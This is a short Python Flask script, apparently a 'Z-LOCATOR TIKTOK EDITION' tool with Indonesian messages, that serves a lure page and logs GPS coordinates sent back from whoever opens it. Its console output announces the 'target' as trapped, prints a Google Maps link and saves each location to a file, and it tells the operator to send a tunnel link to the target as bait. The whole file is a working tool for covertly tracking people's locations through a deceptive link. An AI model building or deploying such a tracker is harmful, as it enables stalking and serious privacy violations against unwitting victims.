from flask import Flask, request, render_template
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)
G, W, R, Y, C = Fore.GREEN + Style.BRIGHT, Fore.WHITE + Style.BRIGHT, Fore.RED + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.CYAN + Style.BRIGHT

app = Flask(__name__)

# Simpan HTML dalam file index.html di folder yang sama
@app.route('/')
def index():
    return open('index.html').read()

@app.route('/log')
def log():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    if lat and lon:
        print(f"\n{R}[!!!] TARGET TERJEBAK! [!!!]")
        print(f"{G}───────────────────────────────────────")
        print(f"{W}LATITUDE  : {Y}{lat}")
        print(f"{W}LONGITUDE : {Y}{lon}")
        print(f"{W}STATUS    : {G}PRESISI GPS AKTIF")
        print(f"{W}GOOGLE MAPS: {C}https://www.google.com/maps?q={lat},{lon}")
        print(f"{G}───────────────────────────────────────")
        
        # Simpan otomatis ke log
        with open("hasil_lacak.txt", "a") as f:
            f.write(f"Waktu: {time.ctime()} | Link: https://www.google.com/maps?q={lat},{lon}\n")
    return "200"

if __name__ == '__main__':
    os.system('clear')
    print(f"{G}Z-LOCATOR TIKTOK EDITION - BY ZEXR01")
    print(f"{W}Sedang memantau umpan... Relax aja bro! ☕")
    print(f"{Y}[!] Berikan link tunnel kamu ke target.")
    app.run(host='0.0.0.0', port=8080)
  
